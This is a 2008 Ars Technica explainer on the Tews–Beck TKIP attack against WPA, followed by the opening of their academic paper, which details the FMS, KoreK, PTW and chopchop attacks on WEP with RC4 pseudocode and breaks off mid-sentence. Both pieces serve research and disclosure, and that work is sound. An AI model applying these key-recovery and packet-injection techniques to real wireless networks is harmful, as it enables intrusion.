=== Content from arstechnica.com_3667f8a5_20250125_015940.html ===


[Skip to content](#main)

[Ars Technica home](https://arstechnica.com/)

Sections

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

* [Feature](/features/)
* [Reviews](/reviews/)
* [Store](/store/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Pin to story

Theme

* HyperLight
* Day & Night
* Dark
* System

Search dialog...

Sign In

Sign in dialog...

Sign in

Biz & IT

# Battered, but not broken: understanding the WPA crack

WiFi security takes a hit with the disclosure of an effective exploit for …

[Glenn Fleishman](https://arstechnica.com/author/glenn-fleishman/)
–
Nov 6, 2008 7:25 pm

| [0](https://arstechnica.com/information-technology/2008/11/wpa-cracked/#comments "0 comments")

Text
settings

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Minimize to nav

## Finding a slim vector

![](https://cdn.arstechnica.net/wp-content/uploads/archive/articles/paedia/wpa-cracked.media/wifi_big.jpg)

Academic researchers have found an exploitable hole in a popular form of wireless networking encryption. The hole is in a part of 802.11i that forms the basis of WiFi Protected Access (WPA), so it could affect routers worldwide. German graduate student Erik Tews will present a paper at next week's PacSec in Tokyo coauthored with fellow student and aircrack-ng team member Martin Beck that reveals how remnants of WPA's predecessor allow them to slip a knife into a crack in the encryption scheme and send bogus data to an unsuspecting WiFi client.

In an interview from Germany, where [he is a PhD candidate](http://www.cdc.informatik.tu-darmstadt.de/mitarbeiter/e_tews.html) studying encryption at the Technical University of Darmstadt, Tews explained that an existing attack on Wired Equivalent Privacy (WEP) was modified to provide a slim vector for sending arbitrary data to networks that use the Temporal Key Integrity Protocol (TKIP). (Tews' collaborator Beck is a student at the Technical University of Dresden; Tews credits Beck with the discovery, after which they jointly developed the paper that Tews will present at [PacSec](http://pacsec.jp/).)

With the Tews/Beck method, an attacker sniffs a packet, makes minor modifications to affect the checksum, and checks the results by sending the packet back to the access point. "It's not a key recovery attack," Tews said, "It just allows you to do the decryption of individual packets." This approach works only with short packets, but could allow ARP (Address Resolution Protocol) poisoning and possibly DNS (Domain Name Service) spoofing or poisoning.

The paper, [Practical Attacks against WEP and WPA](http://dl.aircrack-ng.org/breakingwepandwpa.pdf), is now available for download.

### A history of encryption weakness

The 802.11b specification from the IEEE engineering standards group came with a basic encryption mechanism built in to assuage worries that data would simply be sent in the clear. Wired Equivalent Privacy (WEP) had as its goal a simple baseline: be as secure as an Ethernet jack. It quickly failed. Cracks were seen in 2001, and it was thoroughly broken as early as 2004. Some researchers claim to be able to recover a WEP key in under a minute from an active network. (Most corporations relied on virtual private network connections, which were tunneled through access points located outside a strong firewall, to allow WiFi use without compromising the network.)

The 802.11i task group was formed to replace WEP with something stronger, and they came up with two separate solutions: one looking backwards, the other forwards. Looking back, 802.11i encompassed all WiFi devices ever shipped—starting in 1999—with TKIP. TKIP could be retrofitted to work with older cards through firmware and driver updates. The TKIP work was done first, and incorporated into a branded standard called WPA by the Wi-Fi Alliance, the organization that certifies WiFi gear for interoperability. (You can make 802.11 devices til the cows come home, but you have to be a member of the trade group and pay testing fees—and pass the tests—to label a device with the WiFi moniker.)

![](https://cdn.arstechnica.net/wp-content/uploads/archive/news.media/wepno.png)

WEP: not all that secure

The 802.11i group also added Advanced Encryption System (AES) support—the AES-128 flavor—which uses, take a breath, the Counter Mode with CBC-MAC (Cipher Block Chaining Message Authentication Code) Protocol or CCMP. This flavor of AES both encrypts data and ensures its integrity. The flaw discovered by Tews and Beck cannot work against AES.

When 802.11i started winding down, the Wi-Fi Alliance updated its WPA standard to WPA2. WPA includes a requirement for just TKIP encryption; WPA2 requires support for both TKIP and AES. Almost all gear shipped starting in late 2002 could be upgraded to work with AES—all 802.11g silicon was prepared knowing that AES was coming along—and the Wi-Fi Alliance added mandatory WPA2 support for WiFi certified devices starting in March 2006.

The backwards-looking part of 802.11i is where the standard gets into trouble, according to Tews and Beck's research. By making the WPA algorithm compatible with hardware that could handle the broken WEP algorithm, the WiFi alliance left a tiny gap that the researchers could exploit.

### Crack that WEP: chop, chop!

The flaw in TKIP has to do with checksums, which are used to ensure the integrity and accuracy of data. Checksums work by taking a sequence of numbers that are to be transmitted, applying a transformation to produce a short result, and appending that result to the transmission.

For instance, an ISBN that starts with 978 is 13 digits long, 12 of which represent a unique book number. The 13th is a base 10 number derived from alternately multiplying successive digits by 1 or 3, adding the results, and taking the modulo of 10. If you type in an ISBN incorrectly, a system that recalculates the checksum can determine in many cases if digits are swapped or wrong digits are entered.

With wireless transmission, the odds of missing a bit or getting it wrong are relatively high, and checksums are used both to determine whether there was an error in reception and to ensure the integrity of a packet. If the payload changes and the checksum does not, then a receiver can tell that the packet was tampered with.

This fell apart in WEP, because the checksum was so weak that techniques were developed to allow the data in a packet to be changed and a new checksum calculated. Tews mentioned the tool [chopchop](http://www.netstumbler.org/f50/chopchop-experimental-wep-attacks-12489/), which allows individual packets to be decrypted without cracking a WEP key. This program served as part of the wedge for the exploit.

![](https://cdn.arstechnica.net/wp-content/uploads/archive/articles/paedia/wpa-cracked.media/chopchop.png)

A fragmentation attack

Chopchop works by "chopping" out one byte of data at a time and substituting different values for that byte while calculating a new potential checksum. Chopchop sends each modified packet to an access point, and the AP rejects packets for which the decrypted checksum is invalid. WEP doesn't prevent endless testing in this manner—there's no flood control or other protection.

TKIP added a second layer of integrity through Message Integrity Code (MIC), nicknamed Michael. Michael performs a better-designed checksum that's also encrypted. To prevent the simplicity of chopchop, a client will respond after it receives two bad Michael checksums within 60 seconds: the client shuts down for 60 seconds and then requests a new key exchange with the AP. An AP, faced with the same situation, also shuts down for 60 seconds, then rekeys every client. (802.11i allows new master keys to be created on demand without changing the starting passphrase or network key.)

Here's where Tews said his colleague Beck got extremely clever: because both the WEP and TKIP mechanisms are used one after another, and because the Michael code is contained within the packet that's checksummed by the weaker WEP method, an attempt to crack a packet can first use chopchop without triggering the Michael countermeasures.

## Michael's no angel: its ARP is broken

![](https://cdn.arstechnica.net/wp-content/uploads/archive/articles/paedia/wpa-cracked.media/eriktews.png)

Erik Tews

Tews noted that for very short packets, such as those containing ARP broadcasts—the information that associates an IP address typically with an Ethernet Media Access Control (MAC) address—there's not much left to guess.

Tews said that with an ARP packet, every detail of the payload is known except two bytes of IP address in the message, and that overall only 12 other bytes are unknown: 8 bytes for the Michael code and 4 bytes for the WEP checksum. Once the software cracks Michael and WEP through chopchop, values for the two remaining byte can be tested every 60 seconds without causing a shutdown and rekeying. On average, this takes just 12 to 15 minutes to obtain the values.

We've already established that Beck is clever: here's where he went one step further. This method obtains the keystream, or the part of the process that was used to encrypt the data in the packet. But TKIP has mechanisms to prevent reuse. "There's a replay protection counter," Tews said. "This should usually prevent you from resending packets to the network or re-using the keystream."

![](https://cdn.arstechnica.net/wp-content/uploads/archive/articles/paedia/wpa-cracked.media/ieee802-11-logo.jpg) But Beck discovered that due to yet another 802.11 standard, 802.11e, there was a way to reuse a keystream, thus allowing a packet to be retransmitted with arbitrary data in it, from 7 to 15 more times. Quality of service (QoS), which is used to prioritize packets, falls under the 802.11e task group's work. This was built into WiFi by allowing different queues that can be set to have priority over one another, allowing voice packets to pierce through a miasma of plain data, for instance.

Associated with those queues is the ability to use the same keystream from another queue without triggering the replay protection counter. Tews said that although 802.11e is thought of as having just 4 queues, there are 8 in the standard, and they have found that 8 more also seem to be available for marking packets in some way. They believe this gives them a total of 7 to 15 replays for each packet they extract.

(The crack is available as an in-progress part of [aircrack-ng](http://www.aircrack-ng.org/doku.php), called [tkiptun-ng](http://www.aircrack-ng.org/doku.php?id=tkiptun-ng).)

This can work with a few different kinds of packets, Tews said. "You just need a short packet with hopefully not so much unknown bytes" such as a TCP/IP SYN packet or certain DNS queries.

The extraction only works in one direction, too: because it doesn't reveal the TKIP key or any other keys in use, only packets that appear to be sent from an AP to a client can be injected. But "ARP poisoning should be trivial," Tews noted, allowing an IP address to be associated with a different Ethernet or WiFi adapter on the network.

Tews also believes that firewalls that block only incoming (Internet to LAN) connections could be bypassed with an ARP request that fakes a client into thinking the request is coming from inside the network.

###

### Don't hyperventilate yet; you're (mostly) safe

Now let's back up a little. The early coverage of this crack indicated that TKIP keys were broken. They are not. "We only have a single keystream; we do not recover the keys used for encryption in generating the keystream," Tews said.

To describe the attack succinctly, it's a method of decrypting and arbitrarily and successfully re-encrypting and re-injecting short packets on networks that have devices using TKIP. That's a very critical distinction; this is a serious attack, and the first real flaw in TKIP that's been found and exploited. But it's still a subset of a true key crack.

Tews pointed out that "if you used security features just for preventing other people from using your bandwidth, you are perfectly safe," which is the case for most home users. Someone can't use this attack to break into a home or corporate network, nor decipher all the data that passes.

If a network uses AES, it's immune to this attack, and many corporate and high-security networks settled on AES when it became feasible a couple of years ago in order to avoid any lingering problems with TKIP that might eventually rear their heads.

For networks in which an access point is set to rekey at a regular interval, the attack should be less effective, too. It's unclear whether that setting is available on enterprise access points, and whether network administrations should think about setting it now.

Tews also said that a busy network might defeat this attack; he's unsure whether some access points rekey after a certain amount of traffic passes. "A lot of traffic won't be good for the attack, because it will rekey faster," he said.

Tews said that the basics of network security are still valid, too: for WPA with TKIP or AES, choosing a long network key, perhaps 20 characters that are relatively random, can defeat all known brute-force key cracking methods.

So WPA isn't broken, it turns out, and TKIP remains mostly intact. But this exploit based on integrity and checksums should argue for a fast migration to AES-only WiFi networks for businesses who want to keep themselves secure against further research in this area—research already planned by Tews and Beck. And now that these two have opened the door, WPA will certainly become subject to even closer scrutiny by thousands of others interested in this space: black-, gray-, and white-hatted.

[Glenn Fleishman](https://arstechnica.com/author/glenn-fleishman/)

[Glenn Fleishman](https://arstechnica.com/author/glenn-fleishman/)

[0 Comments](https://arstechnica.com/information-technology/2008/11/wpa-cracked/#comments "0 comments")

Comments

[Forum view](https://arstechnica.com/civis/threads/battered-but-not-broken-understanding-the-wpa-crack.1079747/)

![Loading](https://arstechnica.com/wp-content/themes/ars-v9/public/images/firework-loader.75ab30.gif)

[Prev story](https://arstechnica.com/information-technology/2008/11/creative-releases-linux-x-fi-driver-under-the-gpl/ "Go to: Creative releases Linux X-Fi driver under the GPL")

[Next story](https://arstechnica.com/uncategorized/2008/11/atampt-becomes-worlds-largest-wifi-hotspot-provider-with-wayport-acquisition/ "Go to: AT&amp;T now biggest WiFi hotspot provider with Wayport buy")

Most Read

1. [![Listing image for first story in Most Read: Florida man eats diet of butter, cheese, beef; cholesterol oozes from his body](https://cdn.arstechnica.net/wp-content/uploads/2025/01/GettyImages-486885317-768x432.jpg)](https://arstechnica.com/health/2025/01/florida-man-eats-diet-of-butter-cheese-beef-cholesterol-oozes-from-his-body/)

   1.
   [Florida man eats diet of butter, cheese, beef; cholesterol oozes from his body](https://arstechnica.com/health/2025/01/florida-man-eats-diet-of-butter-cheese-beef-cholesterol-oozes-from-his-body/)
2. 2.
   [All federal agencies ordered to terminate remote work—ideally within 30 days](https://arstechnica.com/tech-policy/2025/01/all-federal-agencies-ordered-to-terminate-remote-work-ideally-within-30-days/)
3. 3.
   [For real, we may be taking blood pressure readings all wrong](https://arstechnica.com/health/2025/01/for-real-we-may-be-taking-blood-pressure-readings-all-wrong/)
4. 4.
   [Trump’s FCC chair gets to work on punishing TV news stations accused of bias](https://arstechnica.com/tech-policy/2025/01/trumps-fcc-chair-gets-to-work-on-punishing-news-stations-accused-of-bias/)
5. 5.
   [Rocket Report: Did China’s reusable rocket work?; DOT may review SpaceX fines](https://arstechnica.com/space/2025/01/rocket-report-dot-may-review-spacex-fines-did-chinas-reusable-rocket-work/)

Customize

Ars Technica has been separating the signal from
the noise for over 25 years. With our unique combination of
technical savvy and wide-ranging interest in the technological arts
and sciences, Ars is the trusted source in a sea of information. After
all, you don’t need to know everything, only what’s important.

More
from Ars

* [About Us](https://arstechnica.com/about-us/)
* [Staff Directory](https://arstechnica.com/staff-directory/)
* [Newsletters](https://arstechnica.com/newsletters/)
* [Ars Videos](https://arstechnica.com/video/)
* [General FAQ](https://arstechnica.com/general-faq/)
* [RSS Feeds](https://arstechnica.com/rss-feeds/)

Contact

* [Contact us](https://arstechnica.com/contact-us/)
* [Advertise with us](https://www.condenast.com/brands/ars-technica)
* [Reprints](https://arstechnica.com/reprints/)

Do Not Sell My Personal
Information

© 2025 Condé Nast. All rights reserved. Use of and/or
registration on any portion of this site constitutes acceptance of our [User Agreement](https://www.condenast.com/user-agreement/) and
[Privacy Policy and
Cookie Statement](https://www.condenast.com/privacy-policy/) and [Ars
Technica Addendum](/amendment-to-conde-nast-user-agreement-privacy-policy/) and [Your
California Privacy Rights](https://www.condenast.com/privacy-policy/#california). Ars Technica may earn compensation on
sales from links on this site. [Read our
affiliate link policy](/affiliate-link-policy/). The material on this site may not be
reproduced, distributed, transmitted, cached or otherwise used, except
with the prior written permission of Condé Nast. [Ad
Choices](https://www.aboutads.info/)



=== Content from dl.aircrack-ng.org_7395f545_20250125_015941.html ===
Practical attacks against
WEP and WPA

Martin Beck, TU-Dresden, Germany
<hirte@aircrack-ng.org>

Erik Tews, TU-Darmstadt, Germany
<e tews@cdc.informatik.tu-darmstadt.de>

November 8, 2008

In this paper, we describe two attacks on IEEE 802.11 based wireless
LANs[2]. The ﬁrst attack is an improved key recovery attack on WEP,
which reduces the average number of packets an attacker has to intercept
to recover the secret key. The second attack is (according to our know-
ledge) the ﬁrst practical attack on WPA secured wireless networks, besides
launching a dictionary attack when a weak pre shared key (PSK) is used.
The attack works if the network is using TKIP to encrypt the traﬃc. An
attacker, who has about 12-15 minutes access to the network is then able
to decrypt an ARP request or response and send 7 packets with custom
content to network.

1 Introduction

IEEE 802.11[2] is a standard family for wireless networks. Such networks can be found
in home, oﬃce, and enterprise environments and are quite popular today. If sensitive
informations are transmitted over a wireless network, privacy and integrity is a concern
and must be taken care of.

The ﬁrst version of the IEEE 802.11 standard supported a basic mechanism for
protecting such networks named Wired Equivalent Privacy (WEP). WEP requires all
clients and access points in the network to share up to four diﬀerent secret symmetric
keys, which is clearly not optimal for a larger installation where users change frequently.
Most installations just use a single secret key named root key. WEP has some major
design ﬂaws and was completely broken in 2001[4, 13] by Fluhrer, Mantin, and Shamir.
They showed that an attacker can recover the secret key of the network with an average
consumer laptop in 1-2 hours. More advanced attacks were published in the last years
making it possible to recover the secret key of the network in less than 60 seconds[15].

1

To ﬁx the problems of WEP, a new standard named Wi-Fi Protected Access (WPA)
was released in 2003, now part of the IEEE 802.11 speciﬁcations[2].

The structure of this paper is as follows: In Section 2, we give an introduction to the
technical details of WEP and WPA and introduce the notation used in the rest of this
paper. In Section 3, we give an overview over a selected number of attacks on WEP.
In Section 4, we present a new attack on WEP, which reduces the number of packets
an attacker needs to intercept to recover the secret root key compared to previous
attacks. In Section 5, we present a new attack on WPA, which allows an attacker,
who has about 12-15 minutes access to a WPA protected network to send 7 packets to
the network with chosen payload and decrypt a single ARP[11] packet. According to
our knowledge, this is the ﬁrst practical attack on WPA protected networks, besides
launching a dictionary attack against a weakly chosen pre shared key.

2 Notation

Numbers are always written in the decimal notation, for example 12 is the number
twelve. The signs + and · are addition and multiplication. (Z/nZ)+ is the additive
group of the numbers 0 to n−1, where all additions are done mod n. When operations
are done in (Z/nZ)+, we write a + b as a short form of a + b mod n. For arrays, we
use the [·] notation as used in many programming languages like C or Java. The
ﬁrst element in the array S is S[0]. Permutations are written as arrays too. If S is
a permutation, S−1 is the inverse permutation. For example, if S[i] = j holds, then
S−1[j] = i holds. When two arrays A and B are concatenated to a new array C, we
write C = A||B. F2 is the ﬁnite ﬁeld with just the two elements 0 and 1. F2[X] is
the ring of polynomials over F2. When specifying estimations for a success probability
or similar things, we use the ≈ sign to note that a formula or a value is only a good
approximation, but not absolutely accurate.

Because WEP is mostly based on the RC4 stream cipher[12], we need to introduce
a notation for analyzing the RC4 stream cipher. RC4 consists of two algorithms, the
RC4-KSA, which transforms a key of length 1 to 256 bytes into an initial permutation
S of the numbers 0 to 255. The internal state of RC4 consists of this permutation S
and two numbers i and j used as pointers to elements of S. The RC4-PRGA generates
a single byte of keystream from such a state and then updates the state.

To analyze the cipher, we will write Sk and jk for the state of S and j, after exactly
k rounds of the loop starting in line 5 in Listing 1 have been executed. To make the
paper more readable, we write n for the constant value 256. Accordingly, we write
Sk+n and jk+n for the state of S and j, after the state was initialized by the algorithm
in Listing 1 and exactly k bytes of output have been produced by the algorithm in
Listing 2. When a key K is used for RC4 and a keystream X of arbitrary length is
produced, we write X = RC4(K). Please note that an attacker who knows the ﬁrst k
bytes of an RC4 key K also knows Sk and jk.

In a WEP protected network, all stations usually share a single symmetric key Rk
named root key. A single packet can easily be lost in an IEEE 802.11 network due to a
transmission error, so WEP needs to encrypt all packets independently. Because RC4
does not support an initialization vector by itself, WEP generates a per packet key

2

Listing 1: RC4-KSA

1
2
3
4
5
6
7
8
9
10

for i ← 0 to 255 do

S[ i ] ← i

end
j ← 0
for i ← 0 to 255 do

j ← j+S[i]+K[i mod len(K)] mod 256
swap(S, i , j )

end
i ← 0
j ← 0

Listing 2: RC4-PRGA

1
2
3
4

i ← i + 1 mod 256
j ← j + S[i] mod 256
swap(S, i , j )
return S[ S[ i ] + S[j] mod 256 ]

for every packet. A three byte initialization vector IV is chosen and prepended to the
root key Rk which results in the per packet key K = IV||Rk. A keystream X = RC4(K)
is generated from K. To protect the integrity of the transmitted data, a 32 bit long
CRC32 checksum named ICV is appended to the data. The resulting plaintext is
then encrypted by XORing the plaintext (including the CRC32 checksum) with the
generated keystream. The ciphertext together with the corresponding unencrypted
initialization vector IV is then send over the air.

WEP originally only speciﬁed a 40 bit secret key Rk, but most vendors implemented
an additional mode where Rk had a length of 104 bits. The length of the corresponding
per packet keys K where 64 or 128 bit, and these variants were mostly marketed as 64
or 128 bit WEP. We restrict ourselves to the 104 bit variant, but our attacks can easily
be adopted for networks with diﬀerent key lengths with only minor modiﬁcations.

3 Previous attacks on WEP

A number of attacks on WEP have been published in the past.

3.1 The FMS attack

Fluhrer, Mantin and Shamir published[4, 13] the ﬁrst key recovery attack on WEP in
2001. Their attack is based on the following ideas: An attacker who listens passively to
the traﬃc of a WEP protected network can record a lot of encrypted packets including
the initialization vectors used for these packets. Because the ﬁrst bytes of the plaintext

3

of most packets are easily predictable, the attacker is able to recover the ﬁrst bytes of
the keystreams used to encrypt these packets. The initialization vector is transmitted
unprotected with the packets, so the attacker initially also knows the ﬁrst 3 bytes of
the per packet key for all packets. All following bytes of the per packet key are the
same for all packets, but are initially unknown to the attacker.

Lets assume that an attacker knows the ﬁrst l bytes of an RC4 key used to generate
a keystream X. He can therefore simulate the ﬁrst l steps of the RC4-KSA and knows
Sl and jl.
In the next step of the RC4-KSA, jl+1 = jl + K[l] + Sl[l] and Sl[l] is
swapped with Sl[jl+1]. If the attacker could reveal Sl+1[l], he could easily recover K[l]
by calculating the diﬀerence S−1
[Sl+1[l]] − jl − Sl[l]. Fluhrer, Mantin, and Shamir used
the following trick to reveal this value:

l

Assume that the following conditions hold after the ﬁrst l steps of the RC4-KSA:

1. Sl[1] < l

2. Sl[1] + Sl[Sl[1]] = l

3. S−1
l
4. S−1
l

[X[0]] (cid:54)= 1

[X[0]] (cid:54)= Sl[1]

In the next step of the RC4-KSA, a value k = Sl[jl+1] will be swapped to Sl+1[l]. If
j changes randomly for the rest of the RC4-KSA, the values S[1], S[S[1]], and S[l] won’t
be altered with a probability of approximately (cid:0) 1
during the remaining RC4-KSA.
When the ﬁrst byte of output is produced by the RC4-PRGA, j will take the value
Sn[1] and Sn[1] and Sn[j] are swapped. After the swap, S[1] + S[S[1]] = l still holds
and the ﬁrst bye of output of the RC4-PRGA X[0] will be S[l]. If conditions 3 or 4
wouldn’t hold, this would indicate that S[1] or S[S[1]] has been altered. In a nutshell,
if these four conditions hold, the fuction:

(cid:1)3

e

Ff ms(K[0], . . . , K[l − 1], X[0]) = S−1

l

[X[0]] − jl − Sl[l]

(1)

will take the value of K[l] with a probability of about (cid:0) 1

≈ 5%. We will refer to
such a set of conditions together with such a function as a correlation for RC4. Flurer,
Mantin, and Shamir referred to these conditions (or at least to the ﬁrst two conditions)
as the resolved condition.

(cid:1)3

e

A full key recovery attack on WEP can be built using this correlation. An at-
tacker captures packets from a WEP protected network and recovers the ﬁrst byte of
keystream used to encrypt these packets by guessing the ﬁrst byte of plaintext. There
are also various active techniques to generate traﬃc on a WEP protected network
even without the key, which allow the recovery of more than the ﬁrst 1000 bytes of
keystream per packet[1]. He selects the packets where the resolved condition holds
and calculates Ff ms for these packets. Each result of Ff ms can be seen as a vote for
the value of Rk[0]. After enough packets have been captured, the attacker makes a
decision for the value of Rk[0] based on the number of votes geberated by Ff ms. If the
decision was correct, the attacker knows the ﬁrst l = 4 bytes of all per packet keys and
can continue with Rk[1]. Please note that all packets need to be reevaluated wether the
resolved condition holds, because this check depends on the value of Rk[0]. After all

4

bytes of Rk have been determined, the attacker checks the resulting key for correctness
using a number of trial decryptions. If the key is correct, the attacker has succeeded.
If the resulting key is incorrect, the attacker looks for a decision for Rk[i], were an
alternative value for Rk[i] was also very likely. The attacker corrects the decision in
the decision tree at depth i and continues the attack with the alternate decision.

Although the 5% success probability of Ff ms looks impressive, the attack needs
4,000,000 to 6,000,000 packets to succeed with a success probability of at least 50%,
depending on the exact environment and implementation[14, 13]. The reason for this
is that the resolved condition holds only for a small amount of randomly chosen ini-
tialization vectors.

3.2 The KoreK attack

In 2004, a person under the pseudonym KoreK posted[9, 3] an implementation of
an advanced WEP cracking tool in an internet forum. KoreK used 16 additional
correlations between the ﬁrst l bytes of an RC4 key, the ﬁrst two bytes of the generated
keystream, and the next keybyte K[l]. Most of these correlations have been found by
KoreK him self, a few had been discussed[5] in public before. KoreK assigned names
like A u15 or A s13 to these attacks, the original FMS attack is called A s5 1 here.
Nearly all correlations found by KoreK use the approach that the ﬁrst or second
byte of the keystream reveals the value of jl+1 under some conditions, if 2-4 values
in S have a special constellation and are not changed during the remaining RC4-KSA
after step l + 1. An interesting exception is the A neg correlation, which doesn’t vote
for a certain value of K[l]. Instead a value can be excluded from the list of possible
candidates for K[l], which can be seen as a negative vote for K[l].

The overall attack structure is the same decision tree based approach as for the
FMS attack. The number of captured packets is reduced to about 700,000 for 50%
success probability[14]. Again, the exact numbers depend on the exact environment
and the implementation and parameters used for the attack. One important factor is if
the initialization vectors are generated by a PRNG algorithm or if they are generated
sequentially by a counter.

3.3 The PTW attack

In 2007, a new generation of WEP attacks was published[15, 14] by Tews, Weinmann,
and Pyshkin. Their attack introduced two new concepts:

1. All previous correlations used required 2-4 values in S not to change during the
remaining RC4-KSA. They also had a lot of preconditions which need to hold to
use the correlation. Therefore, only a small number of packets could be used to
vote for a certain keybyte.

In 2005, Klein showed[7] that l − X[l − 1] takes the value of S[l] with a probability
of 2
n . If Sl[l] remains unchanged until X[l − 1] has been produced, the function:

FKlein(K[0], . . . , K[l − 1], X[l − 1]) = S−1

l

[l − X[l − 1]] − (Sl[l] + jl)

(2)

5

takes the value of K[l] with a probability of 2
n . This result is also known as the
Jenkins correlation[6]. Sl[l] remains unchanged with a probability of approxi-
mately 1
e . If Sl[l] is modiﬁed before X[l − 1] is produced, FKlein takes a more or
less random value. In total, this results in the following probability for FKlein
taking the value of K[l]:

(cid:18)(cid:18) 1
e

(cid:19) 2
n

(cid:19)

(cid:18)(cid:18)

+

1 −

(cid:19)

(cid:19) 1
n

1
e

≈

1.37
n

(3)

This correlation makes no requirements on the internal state of RC4 or the
keystream, so that every packet can be used.

2. The second new concept is a change in the attack structure. Until now, every
key recovery attack had a decision tree based structure and some kind of best
ﬁrst search strategy was used to determine the key byte per byte.

Assume than an attacker knows the ﬁrst l bytes of an RC4 key and manages to
recover k = Sl+2[l + 1] instead of Sl+1[l]. Now S−1
l+1[k] − Sl+1[l + 1] − Sl[l] − jl =
K[l]+K[l+1] holds and an attacker would have recovered the value of K[l]+K[l+1].
With a very high probability S−1
[k] and Sl+1[l + 1] = Sl[l + 1] holds
and S−1

l+1[k] = S−1
[k] − Sl+1[l + 1] − Sl[l] − jl takes the value of K[l] + K[l + 1].

l

l

We will call such correlations between the ﬁrst l bytes of an RC4 key, the gener-
ated keystream, and the next i bytes of the key a multibyte correlation and write
σi for the sum (cid:80)i
k=0 Rk[k]. Tews, Weinmann, and Pyshkin modiﬁed FKlein to
vote for the sum of the next m keybytes for every m ∈ {1, . . . , 13}. This results
in the following functions:

Fptwm (K[0], . . . , K[l − 1], X[l + m − 2])

=S−1
l

[l + m − 1 − X[l + m − 2]] −

(cid:32)l+m−1
(cid:88)

(cid:33)

Sl[a]

a=l

(4)

which only depend on the ﬁrst 3 bytes of the per packet key (IV) and vote for σi
instead of Rk[i].

The PTW attack now works as follows: First an attacker captures packets and
recovers their keystreams as for the FMS and KoreK attack. The attacker knows
the ﬁrst l = 3 bytes of all per packets keys. He now evalues Fptwm for every
packet and every m ∈ {1, . . . , 13} and gets votes for σ0 . . . σ12. After all packets
have been processed, the resulting root key is calculated using Rk[0] = σ0 and
Rk[i] = σi − σi−1. If the key is correct, an alternative decision is made for one
of the values σi and the key is updated using just 12 single subtractions without
the need to reevaluate all packets.

The attack needs just about 35,000 to 40,000 packets[14, 15] for 50% success prob-
ability, which can be collected in less than 60 seconds on a fast network. Only a few
seconds of CPU time is needed to execute the attack.

6

Some modiﬁcations of the PTW attack have been proposed[16, 10] which reduce the
number of packets needed or allow the usage of the PTW attack in some special cases
where the recovery of full key streams is diﬃcult.

3.4 The Chopchop attack

The chopchop attack[8, 14] allows an attacker to interactively decrypt the last m bytes
of plaintext of an encrypted packet by sending m·128 packets in average to the network.
The attack does not reveal the root key and is not based on any special properties of
the RC4 stream cipher.

We can summarize the chopchop attack as follows: Before encryption, a four byte
CRC32 checksum named ICV is appended to the data of the packet. The packet
with the trailing checksum P can be represented as an element of the polynomial ring
F2[X].
If the checksum is correct, P mod PCRC = PON E holds, where PON E is a
known polynomial and PCRC is a known polynomial too, which is irreducible. We can
write P as QX 8 + R. Here R is the last byte of P and Q are all remaining bytes.
When the (encrypted) packet is truncated by one byte, Q will most probably have an
incorrect checksum.

Assume that the attacker knows R. Adding PON E + (X 8)−1(PON E + R) to Q
corrects the checksum again. If R was incorrect here, the resulting packet will have an
incorrect checksum. This addition can also be done on the encrypted packet.

Most access points can be used to distinguish between encrypted packets with correct
and incorrect checksum. For example if a client is not authenticated, and an access
point receives a packet from this client, the access point will generate an error message.
Packets with an incorrect checksum are silently discarded.

An attacker can use this to interactively decrypt packets. The attacker selects a
captured packet for decryption. He truncates the packet by one byte, guesses R,
corrects the checksum and sends the packet to the access point to ﬁnd out if his guess
for R was correct. If the guess for R was correct, the attacker now knows the last byte
of plaintext and can continue with the second last byte. If the guess war incorrect,
he makes another diﬀerent guess for R. After at most 256 guesses and in average 128
guesses, he has guessed the correct value of R.

4 An improved attack on WEP

Unfortunately, after the release of the PTW attack, only little attention was drawn
towards the old KoreK attack. Compared to the PTW attack, the KoreK attack has
the advantage that it only needs the ﬁrst two bytes of the keystreams of all captured
packets. Usually, the recovery of the ﬁrst two bytes of keystream is much easier than
recovering the ﬁrst 15 or 31 bytes. A pleasant exception is the work done by Vaudenay
and Vuagnoux[16], who showed that the correlation used in the FMS attack can also
be rewritten to vote for σi instead of Rk[i]. This correlation is one of the 17 correlations
used in the KoreK attack.

7

Figure 1: Success rate of the new WEP attack

To improve the performance of the PTW attack, we started rewriting all correlations
used by KoreK to vote for σi instead of Rk[i]. Surprisingly, we where able to successfully
modify almost all correlations used by KoreK, with a few exceptions:

The correlations A 4 s13, A 4 u5 1, and A 4 u5 2 in the original KoreK attack can
only be used to vote for Rk[1] when Rk[0] is known. Using these correlations for Rk[2],
Rk[3] or any other keybyte besides Rk[1] has not been implemented by KoreK. The
modiﬁcation of these correlations results in new correlations which vote only for σ1,
even with Rk[0] or σ0 being unknown.

KoreK assigned labels with comments to some correlations. The correlation A u5 3
is the only correlation labeled with the comment no good. When we tried to modify
A u5 3 to vote for σi, the resulting correlation did not produce any useful results.

The correlation A neg was used by KoreK to exclude values from being Rk[i]. The
modiﬁcation of this correlation results in a new correlation which can exclude values
from being σi with a high probability. To implement this additional feature, a negative
weight is assigned to this correlation.

Another interesting extension of the PTW attack was suggested by [16] and [10]
independently. First they showed that it is possible to get four times more votes for
σ13 than for all other values of σi. This makes it much easier for an attacker to decide
on the value of σ12 than all other values of σi. Secondly, they found out, that the
correlation used in the PTW attack can easily be modiﬁed to vote for the value of
σ12 + σi, even when the value of σ12 is unknown at this moment. After the attacker
has decided on the value of σ12, he can get additional votes for each σi, by subtracting
the value of σ12 from these votes. To use these additional correlations, an attacker
